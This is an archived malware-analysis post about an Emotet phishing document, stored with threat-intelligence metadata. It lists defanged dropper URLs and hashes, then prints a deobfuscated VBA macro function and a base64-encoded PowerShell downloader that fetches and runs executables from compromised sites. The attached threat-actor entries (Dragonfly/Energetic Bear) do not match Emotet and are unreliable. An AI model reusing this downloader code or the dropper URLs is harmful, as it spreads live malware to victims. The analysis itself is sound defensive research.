{
    "id": "d227e28b-9ad4-4b48-892c-083f044542cd",
    "created_at": "2023-01-12T15:02:08.566018Z",
    "updated_at": "2025-03-27T02:06:14.752917Z",
    "deleted_at": null,
    "sha1_hash": "e36140bba455df0c700179243b127003b40d190f",
    "title": "2019-03-17 - Emotet malware analysis. Part 1",
    "authors": "",
    "file_creation_date": "2022-05-28T17:34:39Z",
    "file_modification_date": "2022-05-28T17:34:39Z",
    "file_size": 586591,
    "plain_text": "# [ Emotet malware analysis. Part 1. ]\n\n**persianov.net/emotet-malware-analysis-part-1**\n\n=== Mar 17, 2019 ===\n\n\nMarch 17, 2019\n\n\nThis is Part 1 of Emotet malware analysis I’m planning to post. It covers phases 1 and 2 of the attack, specifically phishing and establishing\npersistence in the infected system. Emotet is spread via phishing emails containing malicious links or attachments, and targets everyone\n(individuals, companies and governments).\n\n## Phase 1. Malicious email and document.\n\nFirst phase of the attack starts with a Phishing email. Usually subject, layout, attachments and links are modified periodically by attackers. In\n[this article I’m going to analyze this sample from VirusTotal.](https://www.virustotal.com/#/file/f5e9c63713c7ff968f4958a9b5161e78af05f21493e56555734b89f55b2be24c/detection)\n\nOne of Emotet’s characteristics is constantly changing content of the phishing emails. Usually these contain a malicious link or attachment.\nThis article covers the sample which was spread using via following links:\n\n**URL**\n\n\n-----\n\n**URL**\n\nhxxps://www.tenderheartfoundation.org/knqimf/muwcu-xh8fa-vnewt/\n\nhxxp://clyckmedia.com/clientes/ylhq8-zg1ue-iibdnyco/\n\nhxxp://noithathopehome.com/8brl9if/hldd-m2v2fy-xavkpbbl/\n\nhxxp://cllcanada.ca/2010/lmef-jmlr1n-ftkktgp/\n\nhxxp://www.smilefy.com/it3fqqo/rnk6-9mm14-fcnp.view/\n\nhxxp://cadsupportplus.com/assets/nwi2z-20bew-ffuwbfmt/\n\nhxxp://www.sdhjesov.cz/wordpress/papcc-koe6n-lsric.view/\n\nhxxp://bigkidneys.com/42QQXOURJ/gf1lm-hmr0c-lnkcfak/\n\nhxxp://compraventachocados.cl/css/hgkhx-lin1b-zjkebwycv/\n\nhxxp://cruelacid.com/icon/bmza-8dlyf-jemlc/\n\nhxxp://ecommercedefinitivo.com.br/cursos/ryyjt-tnxm7-byxukc/\n\nhxxp://annual.fph.tu.ac.th/wp-content/uploads/ikvv-lt7rlt-bqcnmly/\n\nhxxp://dbtools.com.br/mailer/ezsvr-mqo7i-zgysfrmwr/\n\nhxxp://demu.hu/wp-content/2h2z2-errsh-sxwqgscp/\n\nhxxp://georgekiser.com/test/z6uwt-r0459s-rqkv.view/\n\nhxxp://wdl.usc.edu/wp-includes/zvlp-s69lox-wrkbb.view/\n\nhxxp://dictionary.me/js/bbrj3-tq4eh-izxcuhnb/\n\nhxxp://duncaninstallation.com/images/u32g-mdxys3-gjcwkz/\n\nhxxp://devpro.ro/misc/3wa1-zykhgf-xcjqnfs/\n\nAll URLs above, once accessed, drop a Microsoft Office Document with macros in it.\n\n**Checksum** **File type** **File Size**\n\nf5e9c63713c7ff968f4958a9b5161e78af05f21493e56555734b89f55b2be24c MS Word Document 246KB (251904 bytes)\n\n### Analysis.\n\nBased on the result we get by running `file command against this sample, it looks like this document has 1 page and doesn’t contain any`\nwords.\n```\nf5e9c63713c7ff968f4958a9b5161e78af05f21493e56555734b89f55b2be24c: Composite Document File V2 Document, Little Endian, \nOs: Windows, Version 6.1, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft\nOffice Word, \nCreate Time/Date: Mon Mar 11 21:32:00 2019, Last Saved Time/Date: Mon Mar 11 21:32:00 2019, Number of Pages: 1, \nNumber of Words: 0, Number of Characters: 5, Security: 0\n\n```\nUsing `Oletools to get the list of document’s objects, 3 macros elements have been found:`\n```\n 7:    74 'Macros/PROJECTwm'\n 8: M  70540 'Macros/VBA/S1ADDQ1A'\n 9: M  14650 'Macros/VBA/YBB1wA'\n 10:   49987 'Macros/VBA/_VBA_PROJECT'\n 11:   1344 'Macros/VBA/__SRP_0'\n 12:    110 'Macros/VBA/__SRP_1'\n 13:    436 'Macros/VBA/__SRP_2'\n 14:    187 'Macros/VBA/__SRP_3'\n 15:    601 'Macros/VBA/dir'\n 16: M  9719 'Macros/VBA/mA4QAX4'\n 17:   4096 'WordDocument'\n\n### Extraction.\n\n```\nObjects 8, 9 and 16 contain Visual Basic code, thus of higher interest for further analysis.\n\n**Object** **Name** **Checksum** **Size**\n\n\n-----\n\n**Object** **Name** **Checksum** **Size**\n\n8 S1ADDQ1A 34ffc69ff37401b965b04fa4f3c1fbcdffab11fd2e34f9e17a8347b70922398b 44KB (44096 bytes)\n\n9 YBB1wA d51c137e3f591a275628e697d2fbb305cc3c630455480508184b45753608d973 8.8KB (8956 bytes)\n\n16 mA4QAX4 d2e56d56ced7ed8de5f701a873086c8134e1311dd574a607a45023f38d5ecaf7 5.6KB (5671 bytes)\n\nOut of all extracted parts of the script, `mA4QAX4 is the entry point and starts the execution once the document is opened. Whole VBS code is`\nobfuscated, as seen in the image below.\n\nAll three parts are dependent on each other and have to be merged, for further analysis. You can find it [HERE.](https://www.virustotal.com/gui/file/50536aaf9cc87b6cf5b3fcd1ef5c11f348737ef28f220872bcbdfb56813c68bc/detection)\n\nThe call chain looks like this:\n\n1. autoopen();\n2. iQwUcAAU(param):\n\nCreates Win32_ProcessStartup class;\nCreates an object of the class by calling Create method;\nPasses param string as command argument, thus starting the execution;\n\nValue of param consists of concatenated results of following functions: `SQoBUAA,` `vDXBUQ,` `rDCAQQcA,` `pAADAADD,` `k1kGUAB,` `cAABQDw .`\nAll these functions are similar in terms of logic and were easy to de-obfuscate. Below is the clean version of `SQoBUAA :`\n```\nFunction SQoBUAA()\nOn Error Resume Next\njkQBUx = \"l -\" + \"nop\" + \" -e\" + \"n\" + \"c\" + \" JA\" + \"BHA\" + \"G\" + \"8Aa\" + \"wB\" + \"HA\" + \"E\" + \"M\" + \"AN\" + \"A\" + \"B\" + \"B\" + \"A\"\n+ \"D\" + \"QA\" + \"PQ\" + \"A\" + \"oAC\"\nlBADQoU = \"cAe\" + \"gBf\" + \"AC\" + \"cAK\" + \"w\" + \"An\" + \"AEE\" + \"AWg\" + \"AnA\" + \"CsA\" + \"Jw\" + \"Br\" + \"A\" + \"G8A\" + \"RAB\"\ntcoAAAAQ = \"B\" + \"ACc\" + \"A\" + \"K\" + \"Q\" + \"A7A\" + \"CQ\" + \"AU\" + \"gBf\" + \"AEE\" + \"A\" + \"a\" + \"w\" + \"AxA\" + \"F8\"\nHAQUxA_ = \"AQQ\" + \"BBA\" + \"D0\" + \"Abg\" + \"BlA\" + \"Hc\" + \"ALQ\" + \"BvA\" + \"GI\" + \"Aa\" + \"gBl\" + \"AG\" + \"MAd\" + \"A\" + \"AgA\" + \"E\" +\n\"4\" + \"A\" + \"Z\" + \"QB0\" + \"A\" + \"C\" + \"4A\" + \"VwB\" + \"lAG\"\ntUQokAA = \"IA\" + \"Qw\" + \"Bs\" + \"AGk\" + \"AZQ\" + \"Bu\" + \"AH\" + \"Q\" + \"A\" + \"O\" + \"wA\" + \"kAG\" + \"k\" + \"AVQ\" + \"Bv\" + \"AF\" + \"8AR\" +\n\"ABB\" + + \"0\" + \"AK\" + \"AA\" + \"n\" + \"A\" + \"GgA\"\ncUAAoX = \"d\" + \"AAn\" + \"ACs\" + \"AJw\" + \"B0\" + \"AH\" + \"A\" + \"AOg\" + \"A\" + \"vA\" + \"C8A\" + \"Yg\" + \"B\" + \"pA\" + \"G\" + \"U\" + \"A\" +\n\"ZAB\" + \"l\" + \"A\" + \"H\" + \"I\" + \"A\" + \"bQ\" + \"Bh\"\nAkQG_A = \"A\" + \"Cc\" + \"AKw\" + \"An\" + \"AG\" + \"4AL\" + \"g\" + \"B\" + \"uAG\" + \"UAd\" + \"AA\" + \"vAG\" + \"wA\" + \"ZQB\" + \"zAG\" + \"wA\" + \"a\" +\n\"QBl\"\nSQoBUAA = jkQBUx + lBADQoU + tcoAAAAQ + HAQUxA_ + tUQokAA + cUAAoX + AkQG_A\nEnd Function\n\n## Phase 2. Persistent Powershell.\n\n```\nA base64 encoded powershell script is extracted and set to run at system’s startup, by the document macros.\n\n\n-----\n\n```\nKQA7ACQAUgBfAEEAawAxAF8AQQBBAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGkAVQBvAF8ARABBAD0AKAA\nnAGgAdAAnACsAJwB0AHAAOgAvAC8AYgBpAGUAZABlAHIAbQBhACcAKwAnAG4ALgBuAGUAdAAvAGwAZQBzAGwAaQBlAC8AbAAnACsAJwBMAC8AJwArACcAQABoAH\nQAdABwADoALwAnACsAJwAvAG4AaQBzAHMAYQAnACsAJwBuAGIAYQAnACsAJwBjAGcAaQBhACcAKwAnAG4AZwAnACsAJwAuAGMAJwArACcAbwBtAC8AdwBwAC0AY\nwBvACcAKwAnAG4AdABlAG4AdAAnACsAJwAvAHgAUgAnACsAJwAzAC8AJwArACcAQAAnACsAJwBoAHQAdAAnACsAJwBwADoALwAnACsAJwAvAGUAcQB1AGkAZABh\nAGQAZABlAGcAZQBuAGUAcgAnACsAJwBvAC4AJwArACcAaQB6AHQAJwArACcAYQBjAGEAbABhAC4AdQAnACsAJwBuAGEAbQAuAG0AeAAvACcAKwAnAHcAcAAtAGE\nAZABtAGkAbgAvACcAKwAnAFgAUABGAC8AQABoAHQAdABwADoALwAvAHcAdwB3AC4AJwArACcAegAnACsAJwBlAHMAdABlAHYAZQBuAHQAJwArACcAcwAuAGMAbw\nAvAHcAcAAtACcAKwAnAGkAJwArACcAbgBjAGwAdQBkAGUAcwAvAEcAJwArACcASgBBACcAKwAnAG8ALwBAAGgAdAB0AHAAJwArACcAOgAvAC8AJwArACcAcwB0A\nHkAJwArACcAbABpACcAKwAnAHMAaABsAGEAYgAuAHcAZQBiAHAAaQB4AGEAYgB5AHQAJwArACcAZQAnACsAJwAuAGMAJwArACcAbwBtAC8AdAAnACsAJwBoAGoA\nbwB3AHIAawA1ACcAKwAnAGUALwA5AFUARwAvACcAKQAuAFMAcABsAGkAdAAoACcAQAAnACkAOwAkAHYAWgBBAEEAQgA0AD0AKAAnAFEAQwBBAEIAJwArACcAQgB\nBAFUAJwApADsAJABKAFUAQQBrAEEAQQAgAD0AIAAoACcANAA4ACcAKwAnADYAJwApADsAJABGAGsAWgBBAEQAWgBVAD0AKAAnAGoAJwArACcANABfAEEAQQBCAE\nEAJwApADsAJABtAFEAVQBrAHcARwA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQASgBVAEEAawBBAEEAKwAoACcALgBlACcAK\nwAnAHgAZQAnACkAOwBmAG8AcgBlAGEAYwBoACgAJAByAEIAQQBCAEQAbwAgAGkAbgAgACQAaQBVAG8AXwBEAEEAKQB7AHQAcgB5AHsAJABSAF8AQQBrADEAXwBB\nAEEALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAcgBCAEEAQgBEAG8ALAAgACQAbQBRAFUAawB3AEcAKQA7ACQAQwBYAGsAQQBBADQAQQA9ACgAJwBWADQ\nAQgBBACcAKwAnAEEAawBBACcAKQA7AEkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAG0AUQBVAGsAdwBHACkALgBsAGUAbgBnAHQAaAAgAC0AZwBlACAANA\nAwADAAMAAwACkAIAB7AEkAbgB2AG8AawBlAC0ASQB0AGUAbQAgACQAbQBRAFUAawB3AEcAOwAkAG4ARABBAEEAdwBvAFgAPQAoACcAcwAnACsAJwBvAEEAeABBA\nEQAJwApADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAGMAdwBRAEEAQQBRAHgAPQAoACcARQBCAG8AYwAnACsAJwBBAEEAJwApADsA\n\n```\nOnce decoded, several URLs pop up which drop phase 3 PE files.\n\nTotally there are 5 different websites, hosting Emotet malware.\n\n**URL** **Dropped PE Checksum** **Size**\n\nhxxp://biederman.net/leslie/lL/ e76900b9b50306564c415423e0eb28463722b0427186134ba301209b4ed2f440 180KB\n(183560\nbytes)\n\nhxxp://nissanbacgiang.com/wp-content/xR3/ 5c2fbc0eaae6ccc8342c22325f0aca1e989beec8d578e3fe57722b807a46c773 180KB\n(183560\nbytes)\n\n\nhxxp://equidaddegenero.iztacala.unam.mx/wpadmin/XPF/\n\n\nbc0d53d74f3f4ef286b4f4caeb8d8b77e32cc17b808dd0de5674842ad713dd72 180KB\n(183560\nbytes)\n\n\nhxxp://stylishlab.webpixabyte.com/thjowrk5e/9UG/ 1c06da405051cfc9f68dbb404e338abb90a38db29f86f17e01487ac2c921c05d 251KB\n(256264\nbytes)\n\nhxxp://www.zestevents.co/wp-includes/GJAo/ 403 HTTP Error N/A\n\n## Conclusion.\n\n\n-----\n\nLooks like the group behind Emotet, haven t focused on heavily obfuscating phase 1 and 2 scripts. Analysis of downloaded samples to follow\nin Part 2 of this article.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-17 - Emotet malware analysis. Part 1.pdf"
    ],
    "report_names": [
        "2019-03-17 - Emotet malware analysis. Part 1.pdf"
    ],
    "threat_actors": [
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535728,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653759279,
    "ts_modification_date": 1653759279,
    "files": {
        "pdf": "https://archive.orkl.eu/e36140bba455df0c700179243b127003b40d190f.pdf",
        "text": "https://archive.orkl.eu/e36140bba455df0c700179243b127003b40d190f.txt",
        "img": "https://archive.orkl.eu/e36140bba455df0c700179243b127003b40d190f.jpg"
    }
}